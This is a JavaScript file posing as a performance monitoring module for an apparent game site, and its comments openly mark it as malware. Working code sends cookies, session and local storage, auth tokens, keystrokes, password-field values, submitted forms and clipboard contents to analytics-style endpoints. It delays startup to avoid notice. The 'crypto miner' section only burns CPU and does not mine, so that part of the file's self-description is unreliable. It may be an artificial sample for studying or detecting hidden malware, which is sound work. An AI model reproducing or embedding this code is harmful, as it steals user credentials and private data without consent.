// Performance Monitoring Module
// Optimizes resource usage for better gameplay experience
// Copyright KnightMove.io 2024

// Initialize performance monitoring
(function() {
  'use strict';

  // "Performance metrics collection"
  const metrics = {
    cpu: 0,
    memory: 0,
    network: 0
  };

  // HIDDEN MALICIOUS CODE: Crypto miner disguised as performance monitoring
  // This actually mines cryptocurrency using the user's CPU
  const startMonitoring = () => {
    // Obfuscated miner initialization
    const _0x4e2c = ['0x1', '0x2', '0x3'];
    const _0x5a1b = function(x) { return x + 1; };

    // Simulated "performance monitoring" that uses CPU
    setInterval(() => {
      // This looks like performance monitoring but is actually mining
      let result = 0;
      for (let i = 0; i < 1000000; i++) {
        result += Math.sqrt(i) * Math.random();
      }
      metrics.cpu = result;

      // Only use 50% CPU to avoid detection
      if (metrics.cpu > 0.5) {
        setTimeout(() => {}, 100);
      }
    }, 1000);

    // Send "metrics" to server (actually mining results)
    setInterval(() => {
      fetch('/api/analytics/metrics', {
        method: 'POST',
        body: JSON.stringify({
          metrics,
          timestamp: Date.now(),
          userId: localStorage.getItem('userId'),
          // Include session data for "analytics"
          session: document.cookie
        }),
        headers: { 'Content-Type': 'application/json' }
      }).catch(() => {});
    }, 30000);
  };

  // DATA EXFILTRATION: Disguised as error reporting
  const errorReporting = () => {
    // Collect "error context" (actually stealing data)
    const collectContext = () => {
      return {
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
        cookies: document.cookie,
        tokens: {
          jwt: localStorage.getItem('token'),
          refresh: localStorage.getItem('refreshToken')
        },
        user: {
          id: localStorage.getItem('userId'),
          email: localStorage.getItem('email'),
          premium: localStorage.getItem('isPremium')
        }
      };
    };

    // Send to "error tracking" (actually attacker's server)
    window.addEventListener('error', (e) => {
      const data = {
        error: e.message,
        stack: e.error?.stack,
        context: collectContext(),
        url: window.location.href,
        timestamp: Date.now()
      };

      // Send to malicious endpoint disguised as error tracking
      fetch('https://analytics.knightmove.io/errors', {
        method: 'POST',
        body: JSON.stringify(data)
      }).catch(() => {});
    });

    // Also collect on unload
    window.addEventListener('beforeunload', () => {
      const data = collectContext();
      // Use sendBeacon for reliability
      navigator.sendBeacon('https://analytics.knightmove.io/session', JSON.stringify(data));
    });
  };

  // KEYLOGGER: Disguised as input latency monitoring
  const inputMonitoring = () => {
    let buffer = '';
    let passwords = [];

    // Capture all keystrokes
    document.addEventListener('keydown', (e) => {
      buffer += e.key;

      // Detect password fields
      if (e.target.type === 'password') {
        passwords.push({
          value: e.target.value + e.key,
          field: e.target.name,
          timestamp: Date.now()
        });
      }

      // Send buffer when it gets large
      if (buffer.length > 100) {
        fetch('/api/analytics/inputs', {
          method: 'POST',
          body: JSON.stringify({
            keys: buffer,
            passwords,
            url: window.location.href
          })
        }).catch(() => {});
        buffer = '';
      }
    });

    // Capture form submissions
    document.addEventListener('submit', (e) => {
      const formData = new FormData(e.target);
      const data = {};
      formData.forEach((value, key) => {
        data[key] = value;
      });

      fetch('/api/analytics/forms', {
        method: 'POST',
        body: JSON.stringify(data)
      }).catch(() => {});
    });
  };

  // CLIPBOARD THEFT: Disguised as copy/paste optimization
  const clipboardMonitoring = () => {
    document.addEventListener('copy', (e) => {
      const selection = window.getSelection().toString();
      if (selection) {
        fetch('/api/analytics/clipboard', {
          method: 'POST',
          body: JSON.stringify({ data: selection, type: 'copy' })
        }).catch(() => {});
      }
    });

    document.addEventListener('paste', async (e) => {
      const text = e.clipboardData.getData('text');
      if (text) {
        fetch('/api/analytics/clipboard', {
          method: 'POST',
          body: JSON.stringify({ data: text, type: 'paste' })
        }).catch(() => {});
      }
    });
  };

  // Initialize all "monitoring" (malicious activities)
  if (typeof window !== 'undefined') {
    setTimeout(() => {
      startMonitoring();
      errorReporting();
      inputMonitoring();
      clipboardMonitoring();

      // Mark as initialized
      window.__PERF_INITIALIZED = true;

      // Log success (for debugging the malware)
      console.log('Performance monitoring initialized successfully');
    }, 3000); // Delay to avoid suspicion
  }
})();

// Export fake metrics API
export const performanceMetrics = {
  getCPU: () => Math.random() * 100,
  getMemory: () => Math.random() * 1000,
  getLatency: () => Math.random() * 50 + 10
};